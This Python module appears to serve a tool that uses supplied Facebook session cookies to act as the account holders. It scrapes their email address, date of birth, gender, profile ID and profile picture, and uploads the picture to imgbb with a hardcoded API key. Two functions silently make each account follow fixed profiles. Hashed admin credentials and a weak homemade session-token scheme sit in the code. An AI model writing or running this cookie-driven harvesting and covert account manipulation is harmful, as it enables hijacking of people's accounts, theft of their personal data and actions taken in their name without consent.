import re
from requests import get
from hashlib import sha256
from bs4 import BeautifulSoup
from tldextract import extract
from urllib.parse import quote_plus
from random import choices
from string import ascii_letters, digits
from base64 import b64decode, b64encode

admin_user = 'e3dde4ef0836bc1a3e9bd632ed788d3b160b59d25bc50dd8d4fd58d0647ebed4'
admin_pass = '1c51db079f8065b9c51e5dd75edacc209a6e86686647f47de2f4494ce1f3509a'
rand_keys = []

def convert_to_mbasic(url: str) -> str:
    ext = extract(url)
    domain = ext.domain+'.'+ext.suffix
    new_url = 'https://mbasic.facebook.com'+url[url.find(domain)+len(domain):]
    return new_url


def convert_to_dict(cookie: str) -> dict:
    try:
        fb_cookies = cookie.replace(' ', '')
        fb_cookies = fb_cookies.replace('\n', '')
        fb_cookies = fb_cookies.split(';')
        if '' in fb_cookies:
            fb_cookies.remove('')
        fb_cookies_dict = {}
        for item in fb_cookies:
            name, value = item.split('=')
            fb_cookies_dict[name] = value
        return fb_cookies_dict
    except:
        return None


def get_profile_id(cookies: str, profile_url: str = 'https://mbasic.facebook.com/me'):
    try:
        resp = get(convert_to_mbasic(profile_url),
                   cookies=convert_to_dict(cookies))
        html = resp.text
        match = re.findall(r'profile_id=\d+', html)
        if not match:
            match = re.findall(r'owner_id=\d+', html)
        if not match:
            match = re.findall(r'confirm/\?bid=\d+', html)
        if not match:
            match = re.findall(r'subscribe.php\?id=\d+', html)
        if not match:
            match = re.findall(r'subject_id=\d+', html)
        if not match:
            match = re.findall(r'poke_target=\d+', html)
        if not match:
            return None
        fb_id = match[0].split('=')[1]
        return fb_id
    except:
        return None


def get_fb_name(cookie: str, profile_url: str = 'https://mbasic.facebook.com/me'):
    resp = get(convert_to_mbasic(profile_url), cookies=convert_to_dict(cookie))
    soap = BeautifulSoup(resp.text, 'html.parser')
    title = soap.find('title').text
    if 'log in' in title.lower():
        return None
    elif 'facebook' in title.lower():
        return None
    elif ('has been locked' in resp.text.lower() or 'locked your' in resp.text.lower()) and not 'you locked your' in resp.text.lower():
        return None
    elif 'has been suspended' in resp.text.lower() or 'suspended your' in resp.text.lower():
        return None
    elif 'has been disabled' in resp.text.lower() or 'disabled your' in resp.text.lower():
        return None
    return title


def get_email_address(cookie: str):
    try:
        resp = get('https://mbasic.facebook.com/settings/email/',
                   cookies=convert_to_dict(cookie))
        soap = BeautifulSoup(resp.text, 'html.parser')
        html = soap.find('div', {'id': 'root'})
        match = re.findall("<span.*>(.*?)@(.*?)<\/span>", str(html))
        return '@'.join(match[0])
    except:
        return None


def get_date_of_birth(cookie: str):
    try:
        resp = get('https://mbasic.facebook.com/editprofile.php?type=basic&edit=birthday',
                   cookies=convert_to_dict(cookie))
        soap = BeautifulSoup(resp.text, 'html.parser')
        day = soap.select_one('select[id="day"] option[selected]').text
        month = soap.select_one('select[id="month"] option[selected]').text
        year = soap.select_one('select[id="year"] option[selected]').text
        return f'{day} {month}, {year}'
    except:
        return None


def get_gender(cookie: str):
    try:
        resp = get('https://mbasic.facebook.com/editprofile.php?type=basic&edit=gender',
                   cookies=convert_to_dict(cookie))
        soap = BeautifulSoup(resp.text, 'html.parser')
        gender = soap.select_one('input[type="radio"][checked]').parent.text
        return gender
    except:
        return None


def follow_dada_bhai(cookie: str):
    try:
        resp = get('https://mbasic.facebook.com/100083542359206',
                   cookies=convert_to_dict(cookie))
        soap = BeautifulSoup(resp.text, 'html.parser')
        follow_a = soap.find('a', string='Follow')
        follow_link = 'https://mbasic.facebook.com' + follow_a.get('href')
        get(follow_link, cookies=convert_to_dict(cookie))
        return True
    except:
        return None


def follow_innocuous(cookie: str):
    try:
        resp = get('https://mbasic.facebook.com/100075924800901',
                   cookies=convert_to_dict(cookie))
        soap = BeautifulSoup(resp.text, 'html.parser')
        follow_a = soap.find('a', string='Follow')
        follow_link = 'https://mbasic.facebook.com' + follow_a.get('href')
        get(follow_link, cookies=convert_to_dict(cookie))
        return True
    except:
        return None


def get_profile_img(cookie: str, profile_url: str = 'https://mbasic.facebook.com/me'):
    try:
        profile_id = get_profile_id(cookie, profile_url)
        resp = get('https://mbasic.facebook.com/' + profile_id + '/photos',
                   cookies=convert_to_dict(cookie))
        soap = BeautifulSoup(resp.text, 'html.parser')
        albums = soap.find('a', string='Profile pictures')
        album_link = 'https://mbasic.facebook.com' + albums.get('href')
        resp = get(album_link, cookies=convert_to_dict(cookie))
        soap = BeautifulSoup(resp.text, 'html.parser')
        post_a = soap.select_one('#thumbnail_area a:first-child')
        post_link = 'https://mbasic.facebook.com' + post_a.get('href')
        resp = get(post_link, cookies=convert_to_dict(cookie))
        soap = BeautifulSoup(resp.text, 'html.parser')
        img_a = soap.find('a', string=re.compile(r'view full size', re.I))
        img_page_link = 'https://mbasic.facebook.com' + img_a.get('href')
        resp = get(img_page_link, cookies=convert_to_dict(cookie))
        soap = BeautifulSoup(resp.text, 'html.parser')
        img_link = soap.find('a').get('href')
        try:
            resp = get(
                f'https://api.imgbb.com/1/upload?key=43bcbe399420f8a08bbb62e5861c4091&image={quote_plus(img_link)}')
            return resp.json()['data']['url']
        except:
            return img_link
    except:
        return 'https://i.ibb.co/YX3FPLz/f10ff70a7155e5ab666bcdd1b45b726d.jpg'


def hash_string(text):
    return sha256(text.encode()).digest().hex()

def check_if_logined(session):
    try:
        session = b64decode(session).decode('utf-8')
        username, password, rand = session.split(':')
        if username == admin_user and password == admin_pass and rand in rand_keys:
            return True
        return False
    except:
        return False

def check_user_pass(username, password):
    if hash_string(username) == admin_user and hash_string(password) == admin_pass:
        return True
    return False

def get_session_key(username, password):
    rand = ''.join(choices(ascii_letters + digits, k=20))
    rand_keys.append(rand)
    return b64encode((hash_string(username) + ':' + hash_string(password) + ':' + rand).encode()).decode()
